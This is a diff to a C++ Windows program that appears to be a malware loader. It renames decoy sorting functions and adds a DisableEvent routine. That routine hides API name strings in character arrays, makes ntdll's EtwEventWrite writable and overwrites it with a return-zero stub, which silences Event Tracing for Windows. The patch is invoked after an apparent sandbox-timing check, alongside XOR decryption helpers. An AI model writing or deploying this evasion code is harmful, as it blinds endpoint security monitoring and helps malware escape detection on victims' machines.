@@ -15,7 +15,7 @@
 using namespace std;
 
 
-void bubbleSort(int arr[], int n) {
+void bubble(int arr[], int n) {
     for (int i = 0; i < n - 1; i++) {
         for (int j = 0; j < n - i - 1; j++) {
             if (arr[j] > arr[j + 1]) {
@@ -36,7 +36,7 @@ void generateAndSortArray() {
         huaarr[i] = std::rand() % 1000;
     }
 
-    bubbleSort(huaarr, ARRAY_SIZE);
+    bubble(huaarr, ARRAY_SIZE);
 
     for (int i = 0; i < ARRAY_SIZE; i++) {
     }
@@ -137,7 +137,7 @@ std::string xorDecrypt(const std::string& data, const std::string& key) {
     return decryptedData;
 }
 
-void quickSort(int arr[], int left, int right) {
+void quick(int arr[], int left, int right) {
     int i = left, j = right;
     int tmp;
     int pivot = arr[(left + right) / 2];
@@ -157,9 +157,9 @@ void quickSort(int arr[], int left, int right) {
     }
 
     if (left < j)
-        quickSort(arr, left, j);
+        quick(arr, left, j);
     if (i < right)
-        quickSort(arr, i, right);
+        quick(arr, i, right);
 }
 
 int decryptKey(int diff, int minValue, int maxValue) {
@@ -199,6 +199,32 @@ void banner() {
     std::cout << "Github: https://github.com/" << str1 + str2 + str3 + str4 + str5 + str6 + str7 + str8 + str9 + str10 + str11 + str12 << std::endl;
 }
 
+BOOL DisableEvent(void) {
+    DWORD oldprotect = 0;
+
+    char eventwrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
+    char dll[] = { 'n','t','d','l','l', 0 };
+    char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };
+
+
+    void* addr = GetProcAddress(GetModuleHandleA(dll), eventwrite);
+    if (!addr) {
+        return FALSE;
+    }
+    BOOL status = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
+    if (!status) {
+        return FALSE;
+    }
+
+    memcpy(addr, patch, sizeof(patch));
+
+    BOOL statusvir = VirtualProtect(addr, 4096, oldprotect, &oldprotect);
+    if (!statusvir) {
+        return FALSE;
+    }
+
+    return TRUE;
+}
 
 std::wstring GetStringTableValue(int resourceId) {
     HINSTANCE hInstance = GetModuleHandle(NULL);
@@ -383,6 +409,11 @@ int main() {
         }
         else {
             if (isTimeAccelerated()) {
+
+                if (!DisableEvent()) {
+                    return -3;
+                }
+
                 cout << "No Find main.txt or StringTable ..." << endl;
 
                 std::cout << "\n";
@@ -406,5 +437,5 @@ int main() {
 
             return 0;
         }
-}
+    }
 }
